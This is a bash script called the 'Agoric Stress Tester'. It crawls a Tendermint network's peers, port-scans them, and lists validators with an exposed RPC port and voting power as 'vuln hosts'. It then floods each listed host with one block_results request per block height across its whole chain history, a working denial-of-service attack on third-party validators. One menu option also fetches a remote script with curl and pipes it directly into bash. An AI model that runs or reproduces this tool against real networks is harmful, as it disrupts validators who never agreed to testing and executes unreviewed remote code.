#!/bin/bash

function setupDeps {
	echo -e "\n\e[104mInstalling dependencies...\e[0m\n"
	sudo apt install dialog wget curl jq -qq -y < "/dev/null"
}

exists()
{
  command -v "$1" >/dev/null 2>&1
}
if exists curl && exists dialog && exists wget && exists jq; then
	:
else
  setupDeps
fi

function parseVulnValidators {
	echo -e "\n\e[104mGetting peers...\e[0m\n"
	agtimestart=$(date +%s)
	agpeers=`curl -m 3 -s 127.0.0.1:26657/net_info | jq .result.peers[].remote_ip | sed 's/"//g' | sed ':a;N;$!ba;s/\n/ /g'`
	port=26657
	echo -e "\n\e[104mLocal peers:\e[0m\n"
	echo $agpeers
	echo -e "\n\e[104mCheck peers connected with local peers...\e[0m\n"
	IFS=' ' read -ra PEERS <<< "$agpeers"
	for i in "${PEERS[@]}"; do
	  echo -e "\e[1A\e[KCheck address:" ${i}
	  nc -zv -w3 ${i} ${port} &>/dev/null \
	  && echo -e "\e[1A\e[KPort" ${port} "open" \
	  && curl -m 3 -s ${i}:26657/net_info | jq .result.peers[].remote_ip | sed 's/"//g' | sed ':a;N;$!ba;s/\n/ /g' >> $HOME/agoric_peers_${agtimestart}.txt \
	  && echo -e "\e[1A\e[KChecked" \
	  || echo -e "\e[1A\e[KTimeout" \
	  || echo -e "\e[1A\e[KPort" ${port} "closed"
	done
	echo -e "\e[1A\e[K"
	echo -e "\n\e[104mAnalysing collected peers...\e[0m\n"
	echo "" > $HOME/agoric_all_peers_${agtimestart}.tmp
	agpeers=`cat $HOME/agoric_peers_${agtimestart}.txt`
	IFS=' ' read -ra PEERS <<< "$agpeers"
	for i in "${PEERS[@]}"; do
	  echo ${i} >> $HOME/agoric_all_peers_${agtimestart}.tmp
	done
	sort $HOME/agoric_all_peers_${agtimestart}.tmp | uniq > $HOME/agoric_all_peers_${agtimestart}.txt
	rm $HOME/agoric_all_peers_${agtimestart}.tmp
	addr_count=`wc -l $HOME/agoric_all_peers_${agtimestart}.txt | awk '{ print $1 }'`
	echo -e "\n\e[104mCollected" ${addr_count} "addresses\e[0m\n"
	echo -e "\n\e[104mAnalysing collected peers...\e[0m\n"
	agpeers=$(cat $HOME/agoric_all_peers_${agtimestart}.txt | tr '\n' ' ')
	IFS=' ' read -ra FULL_PEERS <<< $agpeers
	agvuln=0
	for i in "${FULL_PEERS[@]}"; do
	  echo -e "\e[1A\e[KCheck address:" ${i}
	  nc -zv -w3 ${i} ${port} &>/dev/null \
	  && echo -e "\e[1A\e[KPort" ${port} "open" \
	  && mon=$(curl -m 3 -s ${i}:${port}/status | jq .result.node_info.moniker | sed 's/"//g') \
	  && vp=$(curl -m 3 -s ${i}:${port}/status | jq .result.validator_info.voting_power | sed 's/"//g') \
	  && if [ "$vp" -gt "0" ]; then echo "http://"${i}":"${port} "|" ${mon} "|" ${vp} >> $HOME/agoric_vuln_hosts_${agtimestart}.txt && ((agvuln++)); fi \
	  && echo -e "\e[1A\e[KChecked" \
	  || echo -e "\e[1A\e[KTimeout" \
	  || echo -e "\e[1A\e[KPort" ${port} "closed"
	done
}

function sendRequests {
	echo -e "\e[1A\e[K\e[104mResults:\e[0m"
	echo "RPC URL | Moniker | Power"
	cat $HOME/agoric_vuln_hosts_${agtimestart}.txt
	if (( $agvuln>0 )); then
		echo -e "\e[1A\e[K\e[104mStart testing...\e[0m"
		while read line;
		do 
		addr=`echo $line | awk '{print $1}'` && \
		agcounter=`curl -s $addr/status | jq .result.sync_info.earliest_block_height | sed 's/"//g'` && \
		currHeight=`curl -s $addr/status | jq .result.sync_info.latest_block_height | sed 's/"//g'`;
		echo "Current height:" $currHeight
		echo "Earliest height:" $agcounter
		echo -e "\e[1A\e[K\e[104mAddress: ${addr}\e[0m"
		while (($agcounter<=$currHeight)); 
		do 
			request="/block_results?height=${agcounter}"
			echo -e "\e[1A\e[K\e[104mCurrent payload:" ${addr}${request}"\e[0m"
			(curl -s ${addr}${request} | jq . && echo "") >> $HOME/agoric_test_payload_${agtimestart}.txt; 
			((agcounter++))
		done
		done < $HOME/agoric_vuln_hosts_${agtimestart}.txt
		echo -e "\e[1A\e[K\e[104mTesting finished\e[0m"
	else
		echo -e "\e[1A\e[K\e[104mZero vuln hosts, good job validators\e[0m"
	fi
}

function main {
	HEIGHT=15
	WIDTH=40
	CHOICE_HEIGHT=4
	BACKTITLE="Agoric Stress Tester"
	TITLE="Menu"
	MENU="Choose one of the following options:"

	OPTIONS=(1 "Start Testing"
			 2 "Get hosts with vulnerability"
			 3 "Test your machine"
			 4 "Exit")

	CHOICE=$(dialog --clear --backtitle "$BACKTITLE" \
					--title "$TITLE" \
					--menu "$MENU" \
					$HEIGHT $WIDTH $CHOICE_HEIGHT \
					"${OPTIONS[@]}" \
					2>&1 >/dev/tty)

	clear
	case $CHOICE in
			1)
				parseVulnValidators && sendRequests
				;;
			2)
				parseVulnValidators
				;;
			3)
				curl -sL yabs.sh | bash -s --
				;;
			4)
				echo "Bye!"
				;;
	esac
}

main
